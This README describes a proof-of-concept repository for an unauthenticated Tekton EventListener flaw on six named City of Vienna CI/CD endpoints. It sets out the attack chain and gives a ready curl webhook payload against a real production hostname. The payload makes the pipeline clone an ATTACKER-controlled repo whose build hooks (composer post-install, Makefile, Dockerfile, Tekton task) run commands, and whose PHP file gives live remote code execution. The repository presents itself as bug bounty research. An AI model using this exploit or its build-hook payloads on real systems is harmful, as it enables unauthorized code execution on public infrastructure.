# wien-tekton-poc

**Security Research PoC — Unauthenticated Tekton EventListener (Wien)**

This repository is the attacker-controlled payload repository used in the PoC for:
> **Unauthenticated CI/CD Pipeline Trigger via Tekton EventListeners — Wien Kubernetes Cluster**

## What this repo does

When the Tekton pipeline clones this repo and runs the build phase, it executes:
- `whoami` / `id` / `hostname` — proves code execution inside the build pod
- Kubernetes context dump (`env | grep KUBE`) — proves cluster access
- If deployed: `web/index.php` serves live command output from the production web server

## Attack chain

```
1. Attacker POSTs {} or GitLab-format webhook → Tekton EventListener (no auth)
2. EventListener maps repository.git_http_url from body → PipelineRun param
3. PipelineRun clones THIS repo instead of the legitimate Wien source
4. Build scripts (scripts/build.sh / composer.json / Makefile) execute in build pod
5. If deployed: web/index.php runs on production Wien web server
```

## Files

| File | Trigger | Effect |
|---|---|---|
| `scripts/build.sh` | Pipeline runs shell script | Executes whoami/id/hostname |
| `composer.json` | `composer install` runs | post-install-cmd fires build.sh |
| `Makefile` | `make build` | Executes whoami/id/hostname |
| `Dockerfile` | Docker build | RUN whoami during image build |
| `.tekton/pipeline-poc.yaml` | Tekton PAC | Direct pipeline task injected |
| `web/index.php` | Deployed to server | Live RCE via web request |

## Affected endpoints

All 6 confirmed vulnerable:
- `crgbs3-prod2-tekton-trigger.cms-wien.magwien.gv.at`
- `crgbs3-staging-tekton-trigger.cms-wien.magwien.gv.at`
- `crgbs3-dev-tekton-trigger.cms-wien.magwien.gv.at`
- `ms-prod2-tekton-trigger.cms-wien.magwien.gv.at`
- `ms-staging-tekton-trigger.cms-wien.magwien.gv.at`
- `ms-dev-tekton-trigger.cms-wien.magwien.gv.at`

## Exploit payload (GitLab push format)

```bash
curl -s -X POST \
  "https://crgbs3-prod2-tekton-trigger.cms-wien.magwien.gv.at/" \
  -H "Content-Type: application/json" \
  -H "X-Gitlab-Event: Push Hook" \
  -d '{
    "object_kind": "push",
    "event_name": "push",
    "ref": "refs/heads/main",
    "checkout_sha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repository": {
      "name": "wien-tekton-poc",
      "git_http_url": "https://github.com/ATTACKER/wien-tekton-poc",
      "git_ssh_url": "git@github.com:ATTACKER/wien-tekton-poc.git",
      "homepage": "https://github.com/ATTACKER/wien-tekton-poc"
    },
    "commits": [{
      "id": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "message": "security-research",
      "url": "https://github.com/ATTACKER/wien-tekton-poc/commit/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    }]
  }'
```

---

*This is authorized security research targeting the City of Vienna bug bounty program.*
